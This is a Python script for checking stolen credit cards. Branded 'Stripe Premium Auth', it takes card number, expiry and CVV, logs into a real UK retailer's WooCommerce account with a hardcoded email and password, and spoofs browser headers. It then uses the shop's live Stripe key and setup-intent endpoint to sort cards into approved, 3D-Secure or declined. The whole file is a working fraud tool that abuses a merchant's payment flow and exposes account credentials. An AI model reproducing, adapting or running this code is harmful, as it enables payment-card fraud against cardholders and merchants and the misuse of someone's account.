import requests
import re
import uuid
import time
from fake_useragent import UserAgent

def process_card_sp(cc):
    """
    Process credit card through Stripe Premium Auth gateway
    Returns: dict with status, response, and gateway
    """
    try:
        # Parse the card details
        parts = cc.split("|")
        if len(parts) < 4:
            return {
                "status": "ERROR",
                "response": "Invalid format. Use: CC|MM|YY|CVV",
                "gateway": "Stripe Premium Auth"
            }
        
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        # Format year if needed
        if "20" in yy:
            yy = yy.split("20")[1]
        
        user_agent = UserAgent().random
        stripe_mid = str(uuid.uuid4())
        stripe_sid = str(uuid.uuid4()) + str(int(time.time()))
        
        # Create a session to maintain cookies
        session = requests.Session()
        session.headers.update({
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
        })

        # Set initial cookies
        session.cookies.update({
            'eav-age-verified': '1',
            'cookieyes-consent': 'consentid:MTJZSUhROTJCd3BmZ2FOSGxQa0pCVnZIekJlYmhsTzQ,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
            '_gcl_au': '1.1.1432864692.1756442757',
            '_ga': 'GA1.1.1102049632.1756442757',
            '_ga_VBCXV23BBN': 'GS2.1.s1756442756$o1$g0$t1756442761$j55$l0$h0',
        })

        try:
            # First, try to login with existing credentials instead of registering
            login_response = session.get(
                'https://www.forbiddenfruits.co.uk/my-account/',
                timeout=30
            )
            
            # Extract the login nonce
            login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="([^"]+)"', login_response.text)
            if not login_nonce_match:
                return {
                    "status": "ERROR",
                    "response": "Failed to extract login nonce",
                    "gateway": "Stripe Premium Auth"
                }
            
            login_nonce = login_nonce_match.group(1)
            
            # Login with existing credentials
            login_data = {
                'username': 'darkkboy336@gmail.com',
                'password': '42eruFcXAp6EagN',
                'woocommerce-login-nonce': login_nonce,
                '_wp_http_referer': '/my-account/',
                'login': 'Log in',
            }

            login_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.forbiddenfruits.co.uk',
                'Referer': 'https://www.forbiddenfruits.co.uk/my-account/',
            }

            # Login to the account
            login_result = session.post(
                'https://www.forbiddenfruits.co.uk/my-account/',
                data=login_data,
                headers=login_headers,
                timeout=30
            )
            
            # Check if login was successful by looking for logout link
            if 'Log out' not in login_result.text:
                return {
                    "status": "ERROR",
                    "response": "Login failed - invalid credentials",
                    "gateway": "Stripe Premium Auth"
                }
            
            # Navigate to add payment method page to get the correct nonce
            payment_method_response = session.get(
                'https://www.forbiddenfruits.co.uk/my-account/add-payment-method/',
                timeout=30
            )
            
            # Extract the correct nonce for adding payment method
            nonce_patterns = [
                r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
                r'var wc_add_payment_method_params = {[^}]*"nonce":"([^"]+)"',
                r'var wc_stripe_params = {[^}]*"nonce":"([^"]+)"',
                r'name="_wpnonce" value="([^"]+)"',
            ]
            
            nonce = None
            for pattern in nonce_patterns:
                nonce_match = re.search(pattern, payment_method_response.text)
                if nonce_match:
                    nonce = nonce_match.group(1)
                    break
                    
            if not nonce:
                # Try to find it in the form data
                form_nonce_match = re.search(r'<input[^>]*name="[^"]*nonce[^"]*"[^>]*value="([^"]+)"', payment_method_response.text)
                if form_nonce_match:
                    nonce = form_nonce_match.group(1)
                else:
                    return {
                        "status": "ERROR",
                        "response": "Failed to extract payment method nonce",
                        "gateway": "Stripe Premium Auth"
                    }
                
        except requests.exceptions.Timeout:
            return {
                "status": "ERROR",
                "response": "Website timeout",
                "gateway": "Stripe Premium Auth"
            }
        except Exception as e:
            return {
                "status": "ERROR",
                "response": f"Authentication Failed: {str(e)}",
                "gateway": "Stripe Premium Auth"
            }

        # Step 2: Create payment method with Stripe
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }

        # Clean card number
        clean_card_number = n.replace(" ", "")
        
        data = {
            'billing_details[name]': 'Test User',
            'billing_details[email]': 'darkkboy336@gmail.com',
            'billing_details[address][country]': 'GB',
            'type': 'card',
            'card[number]': clean_card_number,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/e837b000d9; stripe-js-v3/e837b000d9; payment-element; deferred-intent',
            'referrer': 'https://www.forbiddenfruits.co.uk',
            'time_on_page': str(int(time.time())),
            'key': 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs',
        }

        try:
            pm_response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=30
            )
            pm_data = pm_response.json()

            if 'id' not in pm_data:
                error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
                return {
                    "status": "DECLINED",
                    "response": error_msg,
                    "gateway": "Stripe Premium Auth"
                }

            payment_method_id = pm_data['id']
        except Exception as e:
            return {
                "status": "ERROR",
                "response": f"Payment Method Creation Failed: {str(e)}",
                "gateway": "Stripe Premium Auth"
            }

        # Step 3: Create setup intent using the session with auth cookies
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.forbiddenfruits.co.uk',
            'priority': 'u=1, i',
            'referer': 'https://www.forbiddenfruits.co.uk/my-account/add-payment-method/',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': user_agent,
        }

        form_data = {
            'action': 'wc_stripe_create_setup_intent',
            'payment_method_id': payment_method_id,
            'is_platform_payment_method': 'false',
            '_wpnonce': nonce,
        }

        try:
            setup_response = session.post(
                'https://www.forbiddenfruits.co.uk/wp-admin/admin-ajax.php',
                headers=headers,
                data=form_data,
                timeout=30
            )
            
            setup_data = setup_response.json()

            if setup_data.get('success', False):
                data_status = setup_data['data'].get('status')
                if data_status == 'requires_action':
                    return {
                        "status": "APPROVED_OTP",
                        "response": "3D Secure Required",
                        "gateway": "Stripe Premium Auth"
                    }
                elif data_status == 'succeeded':
                    return {
                        "status": "APPROVED",
                        "response": "Payment Succeeded",
                        "gateway": "Stripe Premium Auth"
                    }
                elif 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    return {
                        "status": "DECLINED",
                        "response": error_msg,
                        "gateway": "Stripe Premium Auth"
                    }

            if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                return {
                    "status": "DECLINED",
                    "response": error_msg,
                    "gateway": "Stripe Premium Auth"
                }

            return {
                "status": "DECLINED",
                "response": "Payment Declined",
                "gateway": "Stripe Premium Auth"
            }

        except Exception as e:
            return {
                "status": "ERROR",
                "response": f"Setup Intent Failed: {str(e)}",
                "gateway": "Stripe Premium Auth"
            }

    except Exception as e:
        return {
            "status": "ERROR",
            "response": f"Processing Error: {str(e)}",
            "gateway": "Stripe Premium Auth"
        }
